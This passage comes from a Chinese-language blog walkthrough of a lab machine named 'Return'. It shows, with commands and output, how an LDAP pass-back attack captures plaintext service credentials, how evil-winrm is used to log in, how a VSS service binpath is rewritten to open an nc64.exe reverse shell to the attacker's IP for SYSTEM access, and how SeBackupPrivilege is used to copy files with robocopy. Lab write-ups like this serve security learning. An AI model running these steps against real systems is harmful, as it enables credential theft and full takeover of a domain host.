class="hljs-number">404</span>-like response and created new filter; toggle off with --dont-filter<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">2</span>l       <span class="hljs-number">10</span>w      <span class="hljs-number">151</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><span class="hljs-regexp">/images =&gt; http:/</span><span class="hljs-regexp">/10.129.217.15/im</span>ages/<br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1376</span>l     <span class="hljs-number">2855</span>w    <span class="hljs-number">29090</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/settings.php<br><span class="hljs-number">200</span>      GET       <span class="hljs-number">39</span>l      <span class="hljs-number">196</span>w    <span class="hljs-number">17216</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><span class="hljs-regexp">/images/</span><span class="hljs-number">1</span>.png<br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1345</span>l     <span class="hljs-number">2796</span>w    <span class="hljs-number">28274</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/index.php<br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1345</span>l     <span class="hljs-number">2796</span>w    <span class="hljs-number">28274</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">2</span>l       <span class="hljs-number">10</span>w      <span class="hljs-number">151</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><span class="hljs-regexp">/Images =&gt; http:/</span><span class="hljs-regexp">/10.129.217.15/</span>Images/<br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1345</span>l     <span class="hljs-number">2796</span>w    <span class="hljs-number">28274</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/Index.php<br><span class="hljs-number">301</span>      GET        <span class="hljs-number">2</span>l       <span class="hljs-number">10</span>w      <span class="hljs-number">151</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span><span class="hljs-regexp">/IMAGES =&gt; http:/</span><span class="hljs-regexp">/10.129.217.15/</span>IMAGES/<br><span class="hljs-number">200</span>      GET     <span class="hljs-number">1345</span>l     <span class="hljs-number">2796</span>w    <span class="hljs-number">28274</span>c http:<span class="hljs-regexp">//</span><span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span>/INDEX.php<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-漏洞利用与凭据窃取-Exploitation-Credential-Access"><a href="#3-漏洞利用与凭据窃取-Exploitation-Credential-Access" class="headerlink" title="3.漏洞利用与凭据窃取 (Exploitation &amp; Credential Access)"></a>3.漏洞利用与凭据窃取 (Exploitation &amp; Credential Access)</h3><p>重点看setting.php。</p>
+<p><img src="/2026/01/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-Return/vmware_U62IGeLPCP.png" srcset="/img/loading.gif" lazyload></p>
+<p>看到可以更新，抓一个包看看是怎么回事</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/settings.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.129.217.15<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US,en;q=0.5<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>23<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.129.217.15<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.129.217.15/settings.php<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Priority</span><span class="hljs-punctuation">: </span>u=0, i<br><br><span class="language-abnf"><span class="hljs-attribute">ip</span><span class="hljs-operator">=</span>printer.return.local</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到只发出了ip这个参数，其他的用户名密码什么的都是摆设。</p>
+<p>那么如果把ip设为攻击机的ip，nc监听389端口，会收到什么呢？</p>
+<blockquote>
+<p>这一步攻击的学名叫做 <strong>LDAP Pass-back</strong> 或 <strong>Rogue LDAP Server（恶意 LDAP 服务器）攻击</strong>。</p>
+<p><strong>漏洞成因</strong>： 该打印机管理面板在点击“Update”时，后端 PHP 代码逻辑是为了验证“服务器地址”是否有效，尝试使用用户提供的 IP 地址和当前保存的凭据（User&#x2F;Pass）去发起一个 <strong>LDAP Bind（绑定认证）</strong> 请求。</p>
+<p><strong>为什么是明文？</strong> 通常 LDAP 认证分为 <code>Simple Bind</code>（明文或简单加密）和 <code>SASL</code>（如 NTLM&#x2F;Kerberos）。</p>
+<ul>
+<li>当我们用 <code>nc -lvnp 389</code> 监听时，我们实际上是伪装成了一个 LDAP 服务器。</li>
+<li>受害机（打印机面板）向我们的 IP 发起 TCP 连接。</li>
+<li>我们在 <code>nc</code> 中收到的 <code>0*</code> 开头的乱码字符中夹杂着明文密码 <code>1edFg43012!!</code>，这证明目标发起的是 <strong>LDAP Simple Bind</strong>。如果是 NTLM 认证，我们看到的将是一串 Hash 挑战值，那样就必须使用 <code>Responder</code> 等工具来捕获并破解，而无法直接用 <code>nc</code> 读取。</li>
+<li><strong>结论</strong>：这是一个配置错误，应用在内网中使用了不安全的明文 LDAP 认证方式，导致我们通过欺骗目标连接恶意服务器，直接截获了凭据。</li>
+</ul>
+</blockquote>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/opt/BurpSuitePro]</span><br>└─# nc -lvnp <span class="hljs-number">389</span><br>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">389</span> ...<br>connect <span class="hljs-selector-tag">to</span> <span class="hljs-selector-attr">[10.10.14.70]</span> <span class="hljs-selector-tag">from</span> (UNKNOWN) <span class="hljs-selector-attr">[10.129.217.15]</span> <span class="hljs-number">61769</span><br><span class="hljs-number">0</span>*`%return\svc-printer�<br>                       <span class="hljs-number">1</span>edFg43012!!<br><br><br></code></pre></td></tr></table></figure>
+
+<p>我们成功的收到了一组登录凭据！</p>
+<h3 id="4-建立初始立足点-Initial-Access"><a href="#4-建立初始立足点-Initial-Access" class="headerlink" title="4.建立初始立足点 (Initial Access)"></a>4.建立初始立足点 (Initial Access)</h3><p>现在以此用户的身份探查信息。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc smb <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span> -u <span class="hljs-string">&#x27;svc-printer&#x27;</span> -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span> <span class="hljs-comment">--shares</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (<span class="hljs-type">name</span>:PRINTER) (<span class="hljs-keyword">domain</span>:<span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-keyword">True</span>) (SMBv1:<span class="hljs-keyword">False</span>)                                                                                                                                                    <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [+] <span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>\svc-printer:<span class="hljs-number">1</span>edFg43012!! <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          [*] Enumerated shares<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          <span class="hljs-keyword">Share</span>           Permissions     Remark<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          <span class="hljs-comment">-----           -----------     ------</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          <span class="hljs-keyword">ADMIN</span>$          <span class="hljs-keyword">READ</span>            Remote <span class="hljs-keyword">Admin</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          C$              <span class="hljs-keyword">READ</span>,<span class="hljs-keyword">WRITE</span>      <span class="hljs-keyword">Default</span> <span class="hljs-keyword">share</span><br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          IPC$            <span class="hljs-keyword">READ</span>            Remote IPC<br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          NETLOGON        <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br>SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">445</span>    PRINTER          SYSVOL          <span class="hljs-keyword">READ</span>            Logon <span class="hljs-keyword">server</span> <span class="hljs-keyword">share</span> <br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span> -u <span class="hljs-string">&#x27;svc-printer&#x27;</span> -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span>       <br>WINRM       <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">5985</span>   PRINTER          [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:PRINTER) (<span class="hljs-keyword">domain</span>:<span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>) <br>WINRM       <span class="hljs-number">10.129</span><span class="hljs-number">.217</span><span class="hljs-number">.15</span>   <span class="hljs-number">5985</span>   PRINTER          [+] <span class="hljs-keyword">return</span>.<span class="hljs-keyword">local</span>\svc-printer:<span class="hljs-number">1</span>edFg43012!! (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<p>发现我们有远程登录权限，那么立刻用evil-winrm登录拿到shell</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# evil-winrm -i <span class="hljs-number">10.129</span>.<span class="hljs-number">217.15</span> -u <span class="hljs-string">&#x27;svc-printer&#x27;</span> -p <span class="hljs-string">&#x27;1edFg43012!!&#x27;</span><br>                                        <br>Evil-WinRM shell v3.<span class="hljs-number">7</span><br>                                        <br>Warning: Remote path completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: undefined <span class="hljs-keyword">method</span> `<span class="hljs-title function_">quoting_detection_proc</span>&#x27; <span class="hljs-title function_">for</span> <span class="hljs-title function_">module</span> <span class="hljs-title function_">Reline</span><br>                                        <br><span class="hljs-title function_">Data</span>: <span class="hljs-keyword">For</span> more information, check Evil-WinRM GitHub: https:<span class="hljs-comment">//github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br>                                        <br>Info: Establishing connection <span class="hljs-keyword">to</span> remote endpoint<br>*Evil-WinRM* PS C:\Users\svc-printer\Documents&gt; <br></code></pre></td></tr></table></figure>
+
+<h3 id="5-内部枚举与提权路径分析-Post-Exploitation"><a href="#5-内部枚举与提权路径分析-Post-Exploitation" class="headerlink" title="5.内部枚举与提权路径分析 (Post-Exploitation)"></a>5.内部枚举与提权路径分析 (Post-Exploitation)</h3><p>登录成功后用whoami探查当前身份权限。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\svc-printer\Desktop&gt; whoami /<span class="hljs-keyword">all</span><br><br><span class="hljs-keyword">USER</span> INFORMATION<br><span class="hljs-comment">----------------</span><br><br><span class="hljs-keyword">User</span> <span class="hljs-type">Name</span>          SID<br>================== =============================================<br><span class="hljs-keyword">return</span>\svc-printer S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-21</span><span class="hljs-number">-3750359090</span><span class="hljs-number">-2939318659</span><span class="hljs-number">-876128439</span><span class="hljs-number">-1103</span><br><br><br><span class="hljs-keyword">GROUP</span> INFORMATION<br><span class="hljs-comment">-----------------</span><br><br><span class="hljs-keyword">Group</span> <span class="hljs-type">Name</span>                                 <span class="hljs-keyword">Type</span>             SID          Attributes<br>========================================== ================ ============ ==================================================<br>Everyone                                   Well-known <span class="hljs-keyword">group</span> S<span class="hljs-number">-1</span><span class="hljs-number">-1</span><span class="hljs-number">-0</span>      Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>BUILTIN\<span class="hljs-keyword">Server</span> Operators                   <span class="hljs-keyword">Alias</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-549</span> Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>BUILTIN\Print Operators                    <span class="hljs-keyword">Alias</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-550</span> Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>BUILTIN\Remote Management Users            <span class="hljs-keyword">Alias</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-580</span> Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>BUILTIN\Users                              <span class="hljs-keyword">Alias</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-545</span> Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>BUILTIN\Pre-Windows <span class="hljs-number">2000</span> Compatible <span class="hljs-keyword">Access</span> <span class="hljs-keyword">Alias</span>            S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-32</span><span class="hljs-number">-554</span> Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>NT AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-2</span>      Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>NT AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-11</span>     Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>NT AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-15</span>     Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>NT AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> S<span class="hljs-number">-1</span><span class="hljs-number">-5</span><span class="hljs-number">-64</span><span class="hljs-number">-10</span>  Mandatory <span class="hljs-keyword">group</span>, Enabled <span class="hljs-keyword">by</span> <span class="hljs-keyword">default</span>, Enabled <span class="hljs-keyword">group</span><br>Mandatory Label\High Mandatory <span class="hljs-keyword">Level</span>       Label            S<span class="hljs-number">-1</span><span class="hljs-number">-16</span><span class="hljs-number">-12288</span><br><br><br><span class="hljs-keyword">PRIVILEGES</span> INFORMATION<br><span class="hljs-comment">----------------------</span><br><br>Privilege <span class="hljs-type">Name</span>                Description                         State<br>============================= =================================== =======<br>SeMachineAccountPrivilege     <span class="hljs-keyword">Add</span> workstations <span class="hljs-keyword">to</span> <span class="hljs-keyword">domain</span>          Enabled<br>SeLoadDriverPrivilege         <span class="hljs-keyword">Load</span> <span class="hljs-keyword">and</span> unload device drivers      Enabled<br>SeSystemtimePrivilege         Change the <span class="hljs-keyword">system</span> <span class="hljs-type">time</span>              Enabled<br>SeBackupPrivilege             Back up files <span class="hljs-keyword">and</span> directories       Enabled<br>SeRestorePrivilege            Restore files <span class="hljs-keyword">and</span> directories       Enabled<br>SeShutdownPrivilege           Shut down the <span class="hljs-keyword">system</span>                Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking            Enabled<br>SeRemoteShutdownPrivilege     Force shutdown <span class="hljs-keyword">from</span> a remote <span class="hljs-keyword">system</span> Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working <span class="hljs-keyword">set</span>      Enabled<br>SeTimeZonePrivilege           Change the <span class="hljs-type">time</span> <span class="hljs-type">zone</span>                Enabled<br><br><br><span class="hljs-keyword">USER</span> CLAIMS INFORMATION<br><span class="hljs-comment">-----------------------</span><br><br><span class="hljs-keyword">User</span> claims <span class="hljs-type">unknown</span>.<br><br>Kerberos support <span class="hljs-keyword">for</span> Dynamic <span class="hljs-keyword">Access</span> Control <span class="hljs-keyword">on</span> this device has been disabled.<br></code></pre></td></tr></table></figure>
+
+<p>其中有一个组值得我们注意</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">BUILTIN\<span class="hljs-built_in">Server</span> Operators<br></code></pre></td></tr></table></figure>
+
+<p>这个组允许我们启动&#x2F;停止&#x2F;创建服务，那么我们可以创建一个服务提权到system。</p>
+<h3 id="6-权限提升：滥用-Server-Operators-组-Privilege-Escalation"><a href="#6-权限提升：滥用-Server-Operators-组-Privilege-Escalation" class="headerlink" title="6.权限提升：滥用 Server Operators 组 (Privilege Escalation)"></a>6.权限提升：滥用 Server Operators 组 (Privilege Escalation)</h3><blockquote>
+<p><strong>服务滥用 (Service Abuse) 原理</strong>：</p>
+<ul>
+<li><strong>目标</strong>：Windows 服务默认以 <code>NT AUTHORITY\SYSTEM</code> (System) 这一最高权限身份运行。如果我们能控制一个服务“执行什么代码”，我们就等于控制了 System 权限。</li>
+<li><strong>SCM (Service Control Manager)</strong>：Windows 的服务由 SCM 管理。普通用户无法修改服务配置。</li>
+<li><strong>ACL (访问控制列表)</strong>：<code>Server Operators</code> 组对特定的服务（或所有服务，取决于具体配置）拥有 <code>SERVICE_CHANGE_CONFIG</code> 和 <code>SERVICE_START</code> 权限。</li>
+<li><strong>攻击链</strong>：<ol>
+<li><strong>目标选择</strong>：我们选择了 <code>VSS</code> (Volume Shadow Copy) 服务。这是一个系统服务，默认通常是停止状态，修改它对系统稳定性影响较小（实战中应尽量选择第三方服务，避免破坏系统组件）。</li>
+<li><strong>Payload 注入</strong>：<code>sc.exe config</code> 命令修改了注册表中该服务的 <code>ImagePath</code> (即 <code>binpath</code>)。我们将原本合法的 VSS 路径替换为了我们的反弹 Shell 命令：<code>cmd.exe /c ... nc64.exe ...</code>。</li>
+<li><strong>权限飞跃</strong>：当我们执行 <code>sc start</code> 时，SCM 以为自己在启动合法的 VSS 服务，但实际上它以 System 身份执行了我们的恶意命令。</li>
+</ol>
+</li>
+</ul>
+</blockquote>
+<p>先上传一个nc64.exe</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\&gt; mkdir <span class="hljs-keyword">Temp</span><br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length <span class="hljs-type">Name</span><br><span class="hljs-comment">----                -------------         ------ ----</span><br>d<span class="hljs-comment">-----        1/14/2026   8:22 PM                Temp</span><br><br><br>*Evil-WinRM* PS C:\&gt; cd <span class="hljs-keyword">Temp</span><br>*Evil-WinRM* PS C:\<span class="hljs-keyword">Temp</span>&gt; upload nc64.exe<br>                                        <br><span class="hljs-keyword">Info</span>: Uploading /home/kali/Desktop/nc64.exe <span class="hljs-keyword">to</span> C:\<span class="hljs-keyword">Temp</span>\nc64.exe<br>                                        <br>Data: <span class="hljs-number">60360</span> bytes <span class="hljs-keyword">of</span> <span class="hljs-number">60360</span> bytes copied<br>                                        <br><span class="hljs-keyword">Info</span>: Upload successful!<br>*Evil-WinRM* PS C:\<span class="hljs-keyword">Temp</span>&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>使用该命令修改服务，连接到我们的攻击机。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-operator">*</span>Evil-WinRM<span class="hljs-operator">*</span> PS C:\Temp<span class="hljs-operator">&gt;</span> sc.exe config VSS binpath<span class="hljs-operator">=</span> <span class="hljs-string">&quot;C:<span class="hljs-char escape_">\w</span>indows<span class="hljs-char escape_">\s</span>ystem32<span class="hljs-char escape_">\c</span>md.exe /c C:<span class="hljs-char escape_">\T</span>emp<span class="hljs-char escape_">\n</span>c64.exe -e cmd 10.10.14.70 4444&quot;</span><br>[SC] ChangeServiceConfig SUCCESS<br></code></pre></td></tr></table></figure>
+
+<p>服务修改成功，接下来启动该服务</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css">┌──(root㉿kaada)-<span class="hljs-selector-attr">[/home/kali/Desktop]</span><br>└─# nc -lvvp <span class="hljs-number">4444</span><br>listening on <span class="hljs-selector-attr">[any]</span> <span class="hljs-number">4444</span> ...<br>connect <span class="hljs-selector-tag">to</span> <span class="hljs-selector-attr">[10.10.14.70]</span> <span class="hljs-selector-tag">from</span> return<span class="hljs-selector-class">.local</span> <span class="hljs-selector-attr">[10.129.217.15]</span> <span class="hljs-number">53605</span><br>Microsoft Windows <span class="hljs-selector-attr">[Version 10.0.17763.107]</span><br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. <span class="hljs-attribute">All</span> rights reserved.<br><br>C:\Windows\system32&gt;whoami<br>whoami<br>nt authority\system<br><br>C:\Windows\system32&gt;<br><br></code></pre></td></tr></table></figure>
+
+<h3 id="7-替代提权路径：利用-SeBackupPrivilege-读取敏感文件"><a href="#7-替代提权路径：利用-SeBackupPrivilege-读取敏感文件" class="headerlink" title="7.替代提权路径：利用 SeBackupPrivilege 读取敏感文件"></a>7.替代提权路径：利用 SeBackupPrivilege 读取敏感文件</h3><p>事后探查，发现我们还拥有SeBackupPrivilege</p>
+<p>那么还有一种更简单的方式，就是直接用robocopy复制root.txt到我们的文件夹下</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Temp&gt; robocopy /B C:\Users\Administrator\Desktop C:\Temp<br><br><span class="hljs-code">-------------------------------------------------------------------------------</span><br><span class="hljs-code">   ROBOCOPY     ::     Robust File Copy for Windows</span><br><span class="hljs-code">-------------------------------------------------------------------------------</span><br><br><span class="hljs-code">  Started : Wednesday, January 14, 2026 8:43:07 PM</span><br><span class="hljs-code">   Source : C:\Users\Administrator\Desktop\</span><br><span class="hljs-code">     Dest : C:\Temp\</span><br><br><span class="hljs-code">    Files : *.*</span><br><br><span class="hljs-code">  Options : *.* /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30</span><br><br><span class="hljs-code">------------------------------------------------------------------------------</span><br><span class="hljs-code"></span><br><span class="hljs-code">                           2    C:\Users\Administrator\Desktop\</span><br><span class="hljs-code">          *EXTRA File              45272        nc64.exe</span><br><span class="hljs-code">            New File                 282        desktop.ini</span><br><span class="hljs-code">  0%</span><br><span class="hljs-code">100%</span><br><span class="hljs-code">            New File                  34        root.txt</span><br><span 